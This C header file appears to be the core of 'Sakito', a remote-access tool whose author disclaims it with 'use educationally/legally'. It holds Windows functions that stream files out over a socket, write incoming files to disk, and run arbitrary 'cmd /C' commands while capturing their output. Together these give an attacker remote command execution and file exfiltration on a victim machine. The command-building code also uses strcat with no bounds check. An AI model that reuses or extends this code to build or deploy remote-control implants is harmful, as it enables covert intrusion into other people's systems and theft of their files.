/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_CORE_H
#define SAKITO_CORE_H

#define BUFLEN 8192
#define SUCCESS 1
#define FAILURE -1
#define EXIT_SUCCESS 0
#define INIT_CONN "1"
#define FTRANSFER_FINISHED "1"
#define FTRANSFER_START "1"
#define DIR_NOT_FOUND '0'


#if defined(_WIN32) || defined(_WIN64) || (defined(__CYGWIN__) && !defined(_WIN32))
	HANDLE sakito_win_openf(const LPCTSTR filename, const DWORD desired_access, const DWORD creation_dispostion) {
		return CreateFile(filename,
				desired_access,
				0,
				NULL,
				creation_dispostion,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	}

	// Function for sending file to client (TCP file transfer).
	int sakito_win_sendf(HANDLE h_file, const SOCKET socket, char* const buf, int32_t f_size) {
		uint32_t f_size_bytes = ntohl(f_size); // u_long == uint32_t

		// Send serialized file size int32 bytes to server.
		if (send(socket, (char*)&f_size_bytes, sizeof(uint32_t), 0) < 1)
			return SOCKET_ERROR;

		int i_result = SUCCESS;

		if (f_size > 0) {
			// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
			DWORD bytes_read;
			while ((ReadFile(h_file, buf, BUFLEN, &bytes_read, NULL))
				&& (bytes_read != 0)
				&& (i_result > 0))
				i_result = send(socket, buf, bytes_read, 0);
		}

		// Close the file.
		CloseHandle(h_file);

		return i_result;
	}

	// Function to receive file from client (TCP file transfer).
	int sakito_win_recvf(HANDLE h_file, const SOCKET socket, char* const buf, int32_t f_size) {
		int i_result = 1;

		// Receive all file bytes/chunks and write to parsed filename.
		int32_t total = 0;
		DWORD bytes_written;

		do
			i_result = recv(socket, buf, BUFLEN, 0);
		while ((WriteFile(h_file, buf, i_result, &bytes_written, NULL))
				&& ((total += bytes_written) != f_size)
				&& (i_result > 0));

		return i_result;
	}

	BOOL sakito_win_cp(HANDLE child_stdout_write, const LPSTR buf) {
		// Create a child process that uses the previously created pipes for STDIN and STDOUT.
		PROCESS_INFORMATION pi; 
		STARTUPINFO si;
		memset(&pi, 0, sizeof(pi));
		memset(&si, 0, sizeof(si));

		// Set up members of the STARTUPINFO structure. 
		// This structure specifies the STDIN and STDOUT handles for redirection.
		if (child_stdout_write) {
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = child_stdout_write;
			si.hStdOutput = child_stdout_write;
			si.dwFlags |= STARTF_USESTDHANDLES;
		}

		// 7 + 1 for null termination/string truncation.
		char cmd[BUFLEN+8] = "cmd /C ";
		strcat(cmd, buf);

		// Create the child process.
		BOOL i_result = CreateProcess(NULL, 
						cmd,
						NULL,
						NULL,
						TRUE,
						0,
						NULL,
						NULL,
						&si,
						&pi);

		if (i_result && !child_stdout_write)
			// Wait until child process exits.
			WaitForSingleObject(pi.hProcess, INFINITE);
		else
			CloseHandle(child_stdout_write);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return i_result;
	}
#endif

// Function to copy int bytes to new memory block/location to abide strict aliasing.
static inline uint32_t ntohl_conv(char* const buf) {
	uint32_t new;
	memcpy(&new, buf, sizeof(new));

	// Return deserialized bytes.
	return ntohl(new);
}

#endif
